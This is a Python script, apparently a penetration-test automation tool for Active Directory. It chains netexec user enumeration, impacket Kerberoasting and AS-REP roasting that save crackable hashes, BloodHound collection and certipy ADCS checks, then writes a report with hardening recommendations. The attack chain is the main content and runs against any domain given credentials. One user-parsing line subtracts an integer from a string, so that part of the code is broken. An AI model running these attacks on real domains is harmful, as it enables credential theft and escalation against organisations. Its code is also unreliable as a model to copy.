#!/usr/bin/env python3
"""
Active Directory Penetration Test — Automation Process

Automates AD enumeration, Kerberos attack setup, and reporting.
Requires: impacket, bloodhound-python, netexec, ldap3.

Usage:
    python process.py --domain corp.local --dc-ip 10.0.0.5 -u testuser -p Password123 --output ./results
"""

import subprocess
import json
import os
import argparse
import datetime
from pathlib import Path


def run_command(cmd: list[str], timeout: int = 300) -> tuple[str, str, int]:
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", f"Timed out after {timeout}s", -1
    except FileNotFoundError:
        return "", f"Not found: {cmd[0]}", -1


def enumerate_domain_users(domain: str, dc_ip: str, user: str, password: str,
                            output_dir: Path) -> list[str]:
    """Enumerate domain users via LDAP."""
    print("[*] Enumerating domain users...")
    stdout, stderr, rc = run_command(
        ["netexec", "smb", dc_ip, "-u", user, "-p", password, "-d", domain, "--users"]
    )
    users_file = output_dir / "domain_users.txt"
    users = []
    for line in stdout.splitlines():
        if "\\\\"-1 not in line and domain.split(".")[0].upper() in line.upper():
            parts = line.strip().split()
            for part in parts:
                if "\\" in part:
                    username = part.split("\\")[-1]
                    users.append(username)
    with open(users_file, "w") as f:
        f.write("\n".join(users))
    print(f"[+] Found {len(users)} domain users")
    return users


def get_spn_users(domain: str, dc_ip: str, user: str, password: str,
                   output_dir: Path) -> str:
    """Find Kerberoastable accounts."""
    print("[*] Finding Kerberoastable service accounts...")
    output_file = output_dir / "kerberoast_hashes.txt"
    stdout, stderr, rc = run_command(
        ["impacket-GetUserSPNs", f"{domain}/{user}:{password}",
         "-dc-ip", dc_ip, "-outputfile", str(output_file), "-request"]
    )
    if rc == 0:
        print(f"[+] Kerberoast hashes saved to {output_file}")
    else:
        print(f"[-] Kerberoasting: {stderr[:200]}")
    return str(output_file)


def get_asrep_users(domain: str, dc_ip: str, users_file: str,
                     output_dir: Path) -> str:
    """Find AS-REP Roastable accounts."""
    print("[*] Finding AS-REP Roastable accounts...")
    output_file = output_dir / "asrep_hashes.txt"
    stdout, stderr, rc = run_command(
        ["impacket-GetNPUsers", f"{domain}/", "-usersfile", users_file,
         "-dc-ip", dc_ip, "-outputfile", str(output_file), "-format", "hashcat"]
    )
    if rc == 0:
        print(f"[+] AS-REP hashes saved to {output_file}")
    return str(output_file)


def collect_bloodhound(domain: str, dc_ip: str, user: str, password: str,
                        output_dir: Path) -> None:
    """Run BloodHound data collection."""
    print("[*] Collecting BloodHound data...")
    stdout, stderr, rc = run_command(
        ["bloodhound-python", "-u", user, "-p", password,
         "-d", domain, "-ns", dc_ip, "-c", "all", "--zip"],
        timeout=600
    )
    if rc == 0:
        print("[+] BloodHound data collected")
    else:
        print(f"[-] BloodHound: {stderr[:200]}")


def check_adcs(domain: str, dc_ip: str, user: str, password: str,
                output_dir: Path) -> str:
    """Check for ADCS vulnerabilities."""
    print("[*] Checking ADCS for vulnerable templates...")
    output_file = output_dir / "adcs_findings.txt"
    stdout, stderr, rc = run_command(
        ["certipy", "find", "-u", f"{user}@{domain}", "-p", password,
         "-dc-ip", dc_ip, "-vulnerable", "-stdout"]
    )
    with open(output_file, "w") as f:
        f.write(stdout)
    if "ESC" in stdout:
        print("[+] Vulnerable ADCS templates found!")
    else:
        print("[*] No vulnerable ADCS templates detected")
    return str(output_file)


def generate_report(domain: str, output_dir: Path) -> str:
    """Generate AD pentest report."""
    print("[*] Generating report...")
    report_file = output_dir / "ad_pentest_report.md"
    timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    kerberoast_count = 0
    kf = output_dir / "kerberoast_hashes.txt"
    if kf.exists():
        with open(kf) as f:
            kerberoast_count = sum(1 for line in f if line.strip() and line.startswith("$krb5tgs$"))

    asrep_count = 0
    af = output_dir / "asrep_hashes.txt"
    if af.exists():
        with open(af) as f:
            asrep_count = sum(1 for line in f if line.strip() and line.startswith("$krb5asrep$"))

    with open(report_file, "w") as f:
        f.write(f"# Active Directory Penetration Test Report\n\n")
        f.write(f"**Domain:** {domain}\n")
        f.write(f"**Generated:** {timestamp}\n\n---\n\n")
        f.write("## Kerberos Attack Results\n\n")
        f.write(f"- Kerberoastable accounts: **{kerberoast_count}**\n")
        f.write(f"- AS-REP Roastable accounts: **{asrep_count}**\n\n")
        f.write("## Recommendations\n\n")
        f.write("1. Convert service accounts to Group Managed Service Accounts (gMSA)\n")
        f.write("2. Enforce 25+ character passwords for remaining SPNs\n")
        f.write("3. Enable Kerberos pre-authentication for all accounts\n")
        f.write("4. Audit and remediate ADCS template vulnerabilities\n")
        f.write("5. Implement tiered administration model\n")
        f.write("6. Deploy monitoring for DCSync and Golden Ticket attacks\n")

    print(f"[+] Report: {report_file}")
    return str(report_file)


def main():
    parser = argparse.ArgumentParser(description="AD Pentest Automation")
    parser.add_argument("--domain", required=True)
    parser.add_argument("--dc-ip", required=True)
    parser.add_argument("-u", "--username", required=True)
    parser.add_argument("-p", "--password", required=True)
    parser.add_argument("--output", default="./results")
    args = parser.parse_args()

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    print("=" * 60)
    print(f" AD Penetration Test — {args.domain}")
    print("=" * 60)

    users = enumerate_domain_users(args.domain, args.dc_ip, args.username, args.password, output_dir)
    users_file = str(output_dir / "domain_users.txt")

    get_spn_users(args.domain, args.dc_ip, args.username, args.password, output_dir)
    get_asrep_users(args.domain, args.dc_ip, users_file, output_dir)
    collect_bloodhound(args.domain, args.dc_ip, args.username, args.password, output_dir)
    check_adcs(args.domain, args.dc_ip, args.username, args.password, output_dir)
    generate_report(args.domain, output_dir)

    print("\n[+] AD pentest automation complete")


if __name__ == "__main__":
    main()
